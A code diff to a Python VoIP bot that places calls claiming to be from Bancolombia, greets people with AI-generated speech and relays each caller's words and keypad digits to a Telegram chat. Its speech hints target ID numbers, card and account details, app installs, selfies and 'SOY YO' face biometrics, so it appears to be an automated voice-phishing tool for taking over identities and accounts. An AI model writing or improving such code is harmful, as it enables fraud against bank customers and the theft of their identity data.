@@ -210,12 +210,12 @@ class VoIPManager:
                 logger.error("🚨 AI no disponible - usando mensaje predefinido")
                 initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
             else:
-                # Generar saludo inicial con timeout REDUCIDO
+                # Generar saludo inicial con timeout
                 logger.info("🤖 Generando saludo inicial con AI...")
                 try:
                     initial_message = await asyncio.wait_for(
                         self.caller_bot.ai_conversation.get_initial_greeting(),
-                        timeout=2.0  # 2 segundos máximo para AI
+                        timeout=3.0
                     )
                     logger.info(f"💬 Saludo AI generado: '{initial_message[:60]}...'")
                 except asyncio.TimeoutError:
@@ -281,22 +281,22 @@ class VoIPManager:
                 audio_url = f"{settings.webhook_url}/audio/{audio_filename}"
                 logger.info(f"📡 URL lista: {audio_url}")
                 
-                # Gather: VOZ + DTMF - ULTRA OPTIMIZADO PARA COLOMBIA
+                # Gather: VOZ + DTMF - OPTIMIZADO PARA ESCUCHAR MEJOR
                 gather = Gather(
-                    input='speech dtmf',  # VOZ + TECLADO
-                    language=settings.language,  # es-CO
-                    timeout=settings.gather_timeout,  # 2s espera inicio (más ágil)
-                    speech_timeout=settings.speech_timeout,  # auto - detecta fin inteligente
+                    input='speech dtmf',  # VOZ + TECLADO simultáneo
+                    language=settings.language,  # es-CO (Español Colombia)
+                    timeout=settings.gather_timeout,  # 4 segundos - tiempo para empezar
+                    speech_timeout=settings.speech_timeout,  # auto - escucha hasta que termines
                     speechTimeout=settings.speech_timeout,
-                    maxSpeechTime=settings.max_speech_time,  # 50s máximo - captura completa
+                    maxSpeechTime=settings.max_speech_time,  # 45 segundos
                     action='/voice/process_speech',
                     method='POST',
-                    profanityFilter=False,
+                    profanityFilter=False,  # Sin filtro
                     enhanced=True,  # Reconocimiento mejorado
-                    speech_model='phone_call',
-                    numDigits=20,
-                    # HINTS COLOMBIA - Palabras colombianas frecuentes para reconocimiento PERFECTO
-                    hints='sí, si, no, bueno, listo, claro, dale, perfecto, correcto, ok, okay, entiendo, entendido, aló, hola, diga, oiga, ya, ahora, momento, espere, un momento, cómo, qué, dónde, cuándo, cuál, quién, bien, mal, regular, gracias, por favor, favor, muchas gracias, con gusto, documento, cédula, identificación, nombre, apellido, teléfono, celular, móvil, correo, email, dirección, app, aplicación, programa, banco, Bancolombia, Davivienda, cuenta, ahorros, corriente, tarjeta, débito, crédito, descargar, instalar, bajar, abrir, cerrar, entrar, salir, cámara, foto, selfie, imagen, rostro, cara, identidad, biometría, huella, SOY YO, activar, desactivar, bloquear, desbloquear, confirmar, verificar, validar, autorizar, aceptar, rechazar, cancelar, uno, dos, tres, cuatro, cinco, seis, siete, ocho, nueve, cero, diez, once, doce, quince, veinte, treinta, cien, mil, pues, vea, ve, aja, ajá, uy, ay, eh, mmm, entonces, bueno pues, claro que sí, por supuesto, obviamente, puede ser, tal vez, de pronto, quizás, persona, humano, operador, asesor, servicio, atención, ayuda, problema, error, fallo, no funciona, no sirve, repetir, otra vez, de nuevo, más despacio, no entiendo, no escucho, no oigo'
+                    speech_model='phone_call',  # Optimizado para llamadas
+                    numDigits=20,  # 20 dígitos máximo
+                    # HINTS COLOMBIA - Palabras comunes para mejor reconocimiento
+                    hints='sí, si, claro, no, bueno, bien, mal, regular, listo, perfecto, correcto, gracias, por favor, aló, hola, diga, oiga, espere, momento, ya, ahora, cómo, cuándo, dónde, qué, cuál, quién, cero, uno, dos, tres, cuatro, cinco, seis, siete, ocho, nueve, diez, documento, cédula, nombre, teléfono, celular, correo, banco, Bancolombia, cuenta, tarjeta, app, aplicación, descargar, instalar, cámara, foto, entiendo, entendido, pues, vea, aja, ok, vale, dale, confirmar, activar, verificar, SOY YO, biometría, rostro, identidad'
                 )
                 
                 # Play ElevenLabs dentro de Gather
@@ -328,13 +328,11 @@ class VoIPManager:
             pass
     
     async def _send_ai_response_to_telegram(self, telegram_chat_id: int, text: str):
-        """Enviar respuesta IA a Telegram con formato mejorado"""
+        """Enviar respuesta IA a Telegram"""
         try:
-            timestamp = datetime.now().strftime("%H:%M:%S")
-            message = f"🤖 **KELLY RESPONDE** [{timestamp}]:\n\n{text}"
             await self.caller_bot.telegram_bot.send_message(
                 telegram_chat_id,
-                message
+                f"🤖 Bot:\n{text}"
             )
         except Exception as e:
             logger.warning(f"Error enviando respuesta IA: {e}")
@@ -374,15 +372,12 @@ class VoIPManager:
                 'timestamp': datetime.now()
             })
             
-            # Notificar a Telegram con TRANSCRIPCIÓN DETALLADA
+            # Notificar a Telegram con TIPO de entrada
             emoji = "🎤" if input_type == "VOZ" else "⌨️"
-            timestamp = datetime.now().strftime("%H:%M:%S")
             try:
-                # Mensaje más prominente para transcripciones
-                message = f"{emoji} **CLIENTE DICE** [{timestamp}]:\n\n_{speech_text}_\n\n📝 Capturado por: {input_type}"
                 await self.caller_bot.telegram_bot.send_message(
                     telegram_chat_id,
-                    message
+                    f"{emoji} Usuario ({input_type}):\n{speech_text}"
                 )
             except Exception as e:
                 logger.warning(f"Error enviando a Telegram: {e}")
@@ -447,21 +442,21 @@ class VoIPManager:
             f"Intento {current_attempts}/{max_attempts}"
         )
         
-        # Si se alcanzó el máximo de intentos, colgar
+        # Si se alcanzó el máximo de intentos (2), despedirse y colgar
         if current_attempts >= max_attempts:
-            logger.warning(f"🔴 Finalizando llamada {call_sid} - sin respuesta")
+            logger.warning(f"🔴 Finalizando llamada {call_sid} - sin respuesta después de {max_attempts} intentos")
             
             # Notificar a Telegram
             if call_sid in self.active_calls:
                 telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
                 await self.caller_bot.telegram_bot.send_message(
                     telegram_chat_id,
-                    f"⚠️ Llamada finalizada\n"
-                    f"Sin respuesta después de {max_attempts} intentos"
+                    f"⚠️ Llamada finalizada - Cliente no responde"
                 )
             
-            # Colgar directamente - SIN Polly
+            # Despedida breve y colgar
             response = VoiceResponse()
+            response.say("Gracias, hasta luego.", language='es', voice='Polly.Mia')
             response.hangup()
             return str(response)
         
